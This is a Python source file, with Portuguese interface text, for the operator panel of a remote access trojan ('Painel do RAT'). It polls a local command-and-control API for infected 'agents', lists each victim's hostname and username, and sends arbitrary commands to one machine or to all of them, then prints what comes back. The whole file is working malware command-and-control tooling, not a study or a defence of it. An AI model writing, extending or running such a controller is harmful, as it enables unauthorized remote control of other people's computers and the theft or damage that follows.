import requests
import time
import os

API_URL = "http://localhost:4000/api/v1"

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def fetch_agents():
    try:
        response = requests.get(f"{API_URL}/connections")
        if response.status_code == 200:
            return response.json().get("agents", [])
        return []
    except Exception as e:
        print(f"[ERRO] Não foi possível buscar agentes: {e}")
        return []

def show_agents(agents):
    print("=== Lista de Agents ===")
    if not agents:
        print("Nenhum Agent registrado.\n")
        return
    for i, agent in enumerate(agents):
        status = agent.get("status", "desconhecido")
        print(f"{i+1}. {agent['hostname']} | Usuário: {agent['username']} | Status: {status}")
    print("=======================\n")

def send_command(agent):
    command = input(f"Digite o comando para enviar ao {agent['hostname']}: ").strip()
    if not command:
        print("Comando vazio, abortando...")
        return
    try:
        res = requests.post(f"{API_URL}/{agent['hostname']}", json={"command": command})
        if res.status_code == 200:
            time.sleep(10)
            # Checar resultado retornado
            ret = requests.get(f"{API_URL}/returned/{agent['hostname']}")
            if ret.status_code == 200:
                returned = ret.json().get("returned", "")
                print(f"[RETORNO] {returned}")
            else:
                print("[ERRO] Não foi possível obter retorno do comando.")
        else:
            print(f"[ERRO] Falha ao enviar comando ({res.json().get('message')})")
    except Exception as e:
        print(f"[ERRO] Exception ao enviar comando: {e}")

def send_command_all(agents):
    command = input("Digite o comando para enviar a todos os agentes: ").strip()
    if not command:
        print("Comando vazio, abortando...")
        return
    for agent in agents:
        try:
            res = requests.post(f"{API_URL}/{agent['hostname']}", json={"command": command})
            if res.status_code == 200:
                print(f"[OK] Comando enviado para {agent['hostname']}")
            else:
                print(f"[ERRO] Falha em {agent['hostname']} ({res.status_code})")
        except Exception as e:
            print(f"[ERRO] Exception em {agent['hostname']}: {e}")

def main():
    while True:
        clear_screen()
        print("=== Painel do RAT - Python ===\n")
        agents = fetch_agents()
        show_agents(agents)

        print("Opções:")
        print("1. Enviar comando para um Agent")
        print("2. Enviar comando para todos")
        print("3. Atualizar lista de Agents")
        print("0. Sair\n")

        choice = input("Escolha uma opção: ").strip()

        if choice == "1":
            if not agents:
                input("Nenhum Agent disponível. Pressione Enter para continuar...")
                continue
            idx = input("Digite o número do Agent: ").strip()
            if not idx.isdigit() or int(idx) < 1 or int(idx) > len(agents):
                input("Número inválido. Pressione Enter para continuar...")
                continue
            send_command(agents[int(idx)-1])
            input("Pressione Enter para continuar...")
        elif choice == "2":
            if not agents:
                input("Nenhum Agent disponível. Pressione Enter para continuar...")
                continue
            send_command_all(agents)
            input("Pressione Enter para continuar...")
        elif choice == "3":
            print("Atualizando lista...")
            time.sleep(1)
        elif choice == "0":
            print("Saindo...")
            break
        else:
            input("Opção inválida. Pressione Enter para continuar...")

if __name__ == "__main__":
    main()
